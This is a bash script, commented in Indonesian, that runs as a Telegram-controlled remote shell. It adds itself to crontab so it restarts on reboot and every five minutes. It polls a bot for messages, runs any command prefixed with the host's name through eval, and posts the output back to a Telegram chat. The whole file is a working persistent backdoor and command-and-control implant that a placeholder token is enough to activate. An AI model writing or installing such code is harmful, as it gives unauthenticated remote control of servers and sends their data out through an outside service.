#!/bin/bash

# Pindah ke direktori tempat script ini berada
cd "$(dirname "$0")" || exit

# Konfigurasi
BOT_TOKEN="000000000000000000000"
CHAT_ID="-00000000000"
HOSTNAME="inisialweb"  # Ubah sesuai kebutuhan/ isi inisialweb agar mudah 
PID_FILE="/tmp/bot_cmd.pid"
SCRIPT_PATH="$(realpath "$0")"
OFFSET_FILE="/tmp/bot_offset.txt"

# Fungsi untuk mengirim pesan ke Telegram
send_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$message" \
        -d "parse_mode=HTML" > /dev/null
}

# Pastikan tidak ada instance lain yang berjalan
if [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE")" 2>/dev/null; then
    echo "Bot sudah berjalan. Keluar."
    exit 1
fi

# Tambahkan cronjob agar bot berjalan otomatis saat reboot & monitoring setiap 5 menit
CRON_ENTRY="@reboot nohup bash $SCRIPT_PATH > /dev/null 2>&1 &"
CHECK_CRON_ENTRY="*/5 * * * * pgrep -f '$SCRIPT_PATH' > /dev/null || nohup bash $SCRIPT_PATH > /dev/null 2>&1 &"

# Perbarui crontab jika belum ada
(crontab -l 2>/dev/null | grep -Fxq "$CRON_ENTRY") || (crontab -l 2>/dev/null; echo "$CRON_ENTRY") | crontab -
(crontab -l 2>/dev/null | grep -Fxq "$CHECK_CRON_ENTRY") || (crontab -l 2>/dev/null; echo "$CHECK_CRON_ENTRY") | crontab -

# Notifikasi saat bot pertama kali berjalan
send_message "[$HOSTNAME] bot berhasil masuk kandang"

# Simpan PID untuk pemantauan
echo $$ > "$PID_FILE"

# Trap untuk menangani ketika bot dihentikan (kill, CTRL+C, shutdown)
trap 'send_message "[$HOSTNAME] bot meninggalkan kandang!!"; rm -f "$PID_FILE"; exit' SIGTERM SIGINT

# Load offset terakhir
if [[ -f "$OFFSET_FILE" ]]; then
    OFFSET=$(cat "$OFFSET_FILE")
else
    OFFSET=0
fi

# Loop utama untuk menerima perintah dari Telegram
while true; do
    # Ambil update terbaru dari bot
    RESPONSE=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$OFFSET&limit=1")
    
    # Ambil update terbaru dengan grep & awk
    UPDATE_ID=$(echo "$RESPONSE" | grep -o '"update_id":[0-9]*' | awk -F: '{print $2}' | tail -n1)
    MESSAGE=$(echo "$RESPONSE" | grep -o '"text":"[^"]*"' | awk -F'"' '{print $4}' | tail -n1)

    # Jika ada pesan baru
    if [[ -n "$UPDATE_ID" && -n "$MESSAGE" ]]; then
        OFFSET=$((UPDATE_ID + 1))
        echo "$OFFSET" > "$OFFSET_FILE"  # Simpan offset agar tidak membaca pesan lama

        # Jika pesan adalah chkbot, kirim status bot
        if [[ "$MESSAGE" == "chkbot" ]]; then
            send_message "$HOSTNAME is On"
        fi

        # Cek apakah pesan diawali dengan hostname kita
        if [[ "$MESSAGE" == "$HOSTNAME "* ]]; then
            CMD="${MESSAGE#"$HOSTNAME "}"  # Hapus hostname dari perintah

            if [[ "$CMD" == "restart" ]]; then
                send_message "[$HOSTNAME] Bot akan restart..."
                exec bash "$SCRIPT_PATH"  # Restart bot
            fi

            # Jalankan perintah & ambil output
            OUTPUT=$(eval "$CMD" 2>&1)

            # Kirim hasil eksekusi ke Telegram
            send_message "[$HOSTNAME] Command: <code>$CMD</code>\n\n<pre>$OUTPUT</pre>"
        fi
    fi
    
    # Tunggu 3 detik sebelum loop berikutnya
    sleep 3
done

# Jika script berhenti, kirim pesan dan hapus PID file
send_message "[$HOSTNAME] bot meninggalkan kandang!!"
rm -f "$PID_FILE"
